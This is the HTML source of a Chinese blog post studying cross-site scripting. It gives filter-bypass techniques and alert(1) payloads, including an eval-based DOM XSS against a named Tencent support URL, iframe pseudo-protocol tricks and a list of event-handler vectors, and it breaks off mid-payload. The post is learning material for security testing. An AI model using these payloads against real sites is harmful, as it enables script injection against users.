@@ -1,0 +1,1668 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  
+
+
+
+
+  <meta name="description" content="对这个XSS教程进行了学习与总结">
+<meta name="keywords" content="Study,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="那些年我们一起学 XSS 小结">
+<meta property="og:url" content="https://p2hm1n.github.io/2019/07/21/那些年我们一起学XSS小结/index.html">
+<meta property="og:site_name" content="ONE PIECE">
+<meta property="og:description" content="对这个XSS教程进行了学习与总结">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/P2hm1n/IMG/master/TIM%E6%88%AA%E5%9B%BE20190722110330.png">
+<meta property="og:updated_time" content="2019-07-22T09:02:09.717Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="那些年我们一起学 XSS 小结">
+<meta name="twitter:description" content="对这个XSS教程进行了学习与总结">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P2hm1n/IMG/master/TIM%E6%88%AA%E5%9B%BE20190722110330.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://p2hm1n.github.io/2019/07/21/那些年我们一起学XSS小结/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>那些年我们一起学 XSS 小结 | ONE PIECE</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ONE PIECE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">P2hm1n's blog</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://p2hm1n.github.io/2019/07/21/那些年我们一起学XSS小结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P2hm1n">
+      <meta itemprop="description" content="ONE PIECE">
+      <meta itemprop="image" content="/images/lufei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ONE PIECE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">那些年我们一起学 XSS 小结
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-07-21 14:49:08" itemprop="dateCreated datePublished" datetime="2019-07-21T14:49:08+08:00">2019-07-21</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-07-22 17:02:09" itemprop="dateModified" datetime="2019-07-22T17:02:09+08:00">2019-07-22</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+            <span id="/2019/07/21/那些年我们一起学XSS小结/" class="leancloud_visitors" data-flag-title="那些年我们一起学 XSS 小结">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读次数：</span>
+              
+                <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">8.1k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">7 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>对这个XSS教程进行了学习与总结</p>
+<a id="more"></a>
+
+<h1 id="那些年我们一起学XSS"><a href="#那些年我们一起学XSS" class="headerlink" title="那些年我们一起学XSS"></a>那些年我们一起学XSS</h1><p><a href="https://shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&BugSearch%5Btitle%5D=&BugSearch%5Bvendor%5D=&BugSearch%5Bauthor%5D=%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90&BugSearch%5Bbug_type%5D=&BugSearch%5Bbug_level_by_whitehat%5D=&BugSearch%5Bbug_level_by_vendor%5D=&BugSearch%5Brank_by_whitehat%5D=&BugSearch%5Bbug_date%5D=&page=1" target="_blank" rel="noopener">心伤的瘦子腾讯实例教程链接</a></p>
+<h2 id="什么都没过滤的入门情况"><a href="#什么都没过滤的入门情况" class="headerlink" title="什么都没过滤的入门情况"></a>什么都没过滤的入门情况</h2><p>挖掘流程：在一个URL的众多参数中，一个一个的测试， 发现其中一个参数没有经过过滤，<strong>输入是什么，输出就是什么</strong>， 直接输入 HTML 标签便可以利用。</p>
+<p>我们要看哪些点？</p>
+<ol>
+<li><code>&lt;</code>,<code>&gt;</code>是否被转义</li>
+<li>单引号，双引号是否被转义</li>
+<li><code>/</code>可用吗</li>
+</ol>
+<p>防御：过滤 <code>&lt;</code> 和 <code>&gt;</code></p>
+<p>—分割线—</p>
+<p>一般反射型xss我是没有遇到过什么都没过滤的，存储型的倒是有一些地方过滤不严格（如个人信息处），可以直接<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>就打出xss</p>
+<h2 id="输出在之间的情况"><a href="#输出在之间的情况" class="headerlink" title="输出在之间的情况"></a>输出在<script></script>之间的情况</h2><p>挖掘流程：也是在url中进行的大量的测试，发现输入和输出都未过滤的一个点。但是是蕴含在 <code>&lt;script&gt;</code> 标签中的</p>
+<p>遇见这种情况怎么办？先测试： 是否过滤了 <code>&lt;</code>, <code>&gt;</code>, <code>/</code>等符号</p>
+<p>两种情况如下</p>
+<ol>
+<li>什么都没有过滤——》直接XSS，先用<code>&lt;/script&gt;</code>标签闭合上一个 <code>&lt;script&gt;</code>, 接着自己重新写标签 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>就ok了</li>
+<li>过滤了  <code>&lt;</code>, <code>&gt;</code>之后 ——》 利用当前的环境，插入你能所想到的一切的内容，使得这一段javascript依然【语法正确】，能够【正确执行】，并且能够执行【我们所插入的JS代码】，这样我们的目的就达到了</li>
+</ol>
+<h2 id="输出在HTML属性里的情况"><a href="#输出在HTML属性里的情况" class="headerlink" title="输出在HTML属性里的情况"></a>输出在HTML属性里的情况</h2><p>输出在两个标签之间的情况在大网站不怎么常见了，所以挖洞要找的是输出在HTML属性里的情况。</p>
+<p>栗子</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx.com/search.php?word=乌云欢迎您</span><br><span class="line"></span><br><span class="line">.. 关键词：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"乌云欢迎您"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当没有过滤双引号的时候，就先闭合 <code>value</code>标签，再添加一个事件如: <code>&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; onclick=&quot;alert(1)&quot; /&gt;</code></p>
+<p>当双引号被过滤：</p>
+<ol>
+<li>输出在了 <code>&lt;body style=&quot;[这里]&quot;&gt;</code> , 且没有对反斜线<code>\</code> 进行过滤，在css里，允许使用转义字符, \ + ascii16进制形式。</li>
+<li><code>&lt;HTML标签 onXXXX=&quot;...[输出在这里]..&quot;&gt;</code>的例子 和<code>&lt;a href=&quot;javascript:[输出在这里]&quot;&gt;xxxx &lt;/a&gt;</code> 的例子。Tips:在HTML属性中，会自动对实体字符进行转义。一个简单的比方: <code>&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;</code> 和 <code>&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;</code>是等效的.换言之，只要上面的情况，没有过滤 &amp;，# 等符号，我们就可以写入任意字符。</li>
+</ol>
+<p>—分割线—</p>
+<p>一般挖洞的时候我遇到的这种情况都是先看一下双引号，单引号有没有过滤，过滤了就基本上不bypass了，因为现在几乎都是utf-8编码，而且过滤严格，如果单双引号没过滤还能继续玩其实（过滤了就放弃吧QAQ</p>
+<h2 id="宽字节复仇记"><a href="#宽字节复仇记" class="headerlink" title="宽字节复仇记"></a>宽字节复仇记</h2><p>当想利用 <code>&quot;</code>闭合某些属性时，发现被过滤了。</p>
+<p>查看一下编码格式，如：<code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt;</code>这类的编码，则尝试使用宽字节来闭合掉双引号，再执行我们想要执行的JavaScript代码</p>
+<p>—分割线—</p>
+<p>很少的没遇到过</p>
+<h2 id="反斜线复仇记"><a href="#反斜线复仇记" class="headerlink" title="反斜线复仇记"></a>反斜线复仇记</h2><p>前提：双引号是用不了， 但是 反斜线还可以使用。</p>
+<p>缺陷部分是：<code>location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;;//后面省略。</code></p>
+<p>核心思路：用 <code>\</code>吃掉双引号，后续因为涉及到了一些过滤，所以还需要绕过balabala的…</p>
+<h2 id="换行符复仇记"><a href="#换行符复仇记" class="headerlink" title="换行符复仇记"></a>换行符复仇记</h2><p>先经过测试，发现页面内输出的结果中都过滤了 <code>&lt;</code> ，<code>&gt;</code> ，<code>&quot;</code> 等符号</p>
+<p>突破点：在一段注释中发现了要输出的结果，而且没有过滤换行符 <code>%0a</code></p>
+<p>所以直接输入 <code>%0aalert(1);//</code>会导致</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//我是注释xxxxxxxxx[我是输出  换行符</span><br><span class="line"> alert(1);//我是输出]</span><br></pre></td></tr></table></figure>
+
+<h2 id="宽字节、反斜线与换行符一起复仇记"><a href="#宽字节、反斜线与换行符一起复仇记" class="headerlink" title="宽字节、反斜线与换行符一起复仇记"></a>宽字节、反斜线与换行符一起复仇记</h2><p>经过查找发现有三处有输出，第一处的双引号被灭掉了，还剩下两处都是在注释里面，且在<code>&lt;script&gt;</code>标签里面</p>
+<p>用换行符 <code>%0a</code> 逃逸出了注释</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span>  a=<span class="string">"我是一个字符串\</span></span><br><span class="line"><span class="string">我还是一个字符串"</span>;</span><br><span class="line">alert(a);</span><br></pre></td></tr></table></figure>
+
+<p>构造多行，但是由于第一行构造的时候需要一个反斜线，但是直接加反斜线会再添加一个反斜线</p>
+<p>查看网页编码发现是 <code>gbxxx</code> 格式的编码，故利用宽字节吃掉反斜线</p>
+<p>最终实现弹窗</p>
+<h2 id="Dom-Xss入门-显式输出"><a href="#Dom-Xss入门-显式输出" class="headerlink" title="Dom Xss入门 [显式输出]"></a>Dom Xss入门 [显式输出]</h2><p>关注的不仅是【输出】了什么，还要了解这个页面里，【javascript】拿这个【输出】干了什么</p>
+<p>这节内容是 【输出】直接在源代码可见的情况。</p>
+<p>（直接F12就ok了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">"a"</span>).innerHTML=<span class="string">" &lt;img src=1&gt; "</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行了就是个小图，更改payload可弹出xss</p>
+<h2 id="Dom-Xss入门-隐式输出"><a href="#Dom-Xss入门-隐式输出" class="headerlink" title="Dom Xss入门 [隐式输出]"></a>Dom Xss入门 [隐式输出]</h2><p>和原来的直接右键查看源代码不同，这次选择F12(Chrome为例)，查看源代码，并且可以直接在里面进行搜索</p>
+<p>还是根据过滤采取相对应的绕过（看代码的逻辑</p>
+<h2 id="Dom-Xss进阶-邂逅eval"><a href="#Dom-Xss进阶-邂逅eval" class="headerlink" title="Dom Xss进阶 [邂逅eval]"></a>Dom Xss进阶 [邂逅eval]</h2><p><strong>显式输出和隐式输出</strong>。但是不论怎么样，因为最终javascript都会通过<strong>document.write或innerHTML</strong>将内容输出到网页中，所以我们总是有办法看到输出到哪里。 但是有时候，我们的输出，最终并没有流向innerHTML或document.write，而是与eval发生了邂逅，我们该怎么挖掘并利用呢</p>
+<p>特点：搜索源代码和调试工具都看不到任何东西。</p>
+<p>操作:尽可能的在后面加上特殊符号，使其报错，然后再控制台的Console里面查看错误，定位到语句</p>
+<p><img src="https://raw.githubusercontent.com/P2hm1n/IMG/master/TIM%E6%88%AA%E5%9B%BE20190722110330.png" alt></p>
+<p>URL为：<a href="http://kf.qq.com/search_app.shtml?key=aaaaa" target="_blank" rel="noopener">http://kf.qq.com/search_app.shtml?key=aaaaa</a></p>
+<p>出问题的代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var getarg = function()</span><br><span class="line">&#123;</span><br><span class="line">	var url = window.location.href;</span><br><span class="line">	var allargs = url.split("?")[1];</span><br><span class="line">	if (allargs!=null &amp;&amp; allargs.indexOf("=")&gt;0)</span><br><span class="line">	&#123;</span><br><span class="line">		var args = allargs.split("&amp;");</span><br><span class="line">		for(var i=0; i<span class="tag">&lt;<span class="name">args.length;</span> <span class="attr">i</span>++)</span></span><br><span class="line"><span class="tag">		&#123;</span></span><br><span class="line"><span class="tag">			<span class="attr">var</span> <span class="attr">arg</span> = <span class="string">args[i].split(</span>"=<span class="string">");</span></span></span><br><span class="line"><span class="tag"><span class="string">			eval('this.'+arg[0]+'="</span>'+<span class="attr">arg</span>[<span class="attr">1</span>]+'";');</span></span><br><span class="line"><span class="tag">		&#125;</span></span><br><span class="line"><span class="tag">	&#125;</span></span><br><span class="line"><span class="tag">&#125;;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码的大致功能是获得<code>？</code>地址栏参数的代码。</p>
+<p>构造前面的key <a href="http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa" target="_blank" rel="noopener">http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa</a></p>
+<p>弹窗</p>
+<p>构造后面的值 <a href="http://kf.qq.com/search_app.shtml?key=aaa&quot;;alert(1);//" target="_blank" rel="noopener">http://kf.qq.com/search_app.shtml?key=aaa&quot;;alert(1);//</a></p>
+<p>弹窗</p>
+<p>【IE可运行，chrome会被编码】</p>
+<h2 id="Dom-Xss进阶-善变iframe"><a href="#Dom-Xss进阶-善变iframe" class="headerlink" title="Dom Xss进阶 [善变iframe]"></a>Dom Xss进阶 [善变iframe]</h2><p><strong>iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。</strong></p>
+<p>一些payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.1 最好懂的，onload执行js</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">1.2 src 执行javascript代码</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">1.3 IE下vbscript执行代码</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"vbscript:msgbox(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">1.4 Chrome下data协议执行代码</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> Chrome</span><br><span class="line"></span><br><span class="line">1.5 上面的变体</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">1.6 Chrome下srcdoc属性</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在栗子中的代码有一段话</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function OpenFrame(url) &#123;</span><br><span class="line">	if (url.toLowerCase().indexOf('http://') != '-1' || url.toLowerCase().indexOf('https://') != '-1' || url.toLowerCase().indexOf('javascript:') != '-1') return false;</span><br><span class="line">	document.getElementById("toolframe").src = url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了 <code>javascript</code> 这个payload</p>
+<p>所以采用其他伪协议绕过</p>
+<p>危险的不光是javascript:，vbscript:, data: 等同样需要过滤。</p>
+<h2 id="存储型XSS入门-什么都没过滤的情况"><a href="#存储型XSS入门-什么都没过滤的情况" class="headerlink" title="存储型XSS入门 [什么都没过滤的情况]"></a>存储型XSS入门 [什么都没过滤的情况]</h2><p><strong>什么都没过滤的挖掘技巧</strong></p>
+<p>先找到输出点，然后猜测此处输出是否会被过滤。——》如果觉得可能没过滤，我们再找到这个输出是在哪里输入的。——》接着开始测试输入，看输出的效果。——》如果没过滤，那么你就成功了，否则你可以放弃掉它。</p>
+<h2 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h2><p>HTML5的年代，Flash不是被淘汰了吗（其实还是因为懒，不想学…</p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>参考自：<a href="https://xz.aliyun.com/t/4067#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-8</a></p>
+<h3 id="无过滤"><a href="#无过滤" class="headerlink" title="无过滤"></a>无过滤</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert("xss");<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">"alert('xss');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">"alert('xss');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>  <span class="attr">onerror</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span></span><br><span class="line">利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span 